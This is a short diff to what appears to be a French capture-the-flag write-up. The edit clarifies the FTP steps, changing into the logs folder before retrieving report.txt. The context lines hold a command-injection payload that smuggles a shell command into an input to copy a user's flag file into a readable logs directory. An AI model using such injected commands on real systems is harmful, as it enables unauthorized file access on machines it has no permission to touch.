@@ -165,7 +165,9 @@ Payload :
 A'; cat /home/bruce/user.txt > /opt/hotline/logs/report.txt; echo 'B
 ```
 
-Récupération via FTP (`get report.txt`), puis :
+Puis
+
+Récupération via FTP en allant dans le dossier logs (`cd logs`) puis (`get report.txt`), puis :
 
 ```bash
 cat report.txt
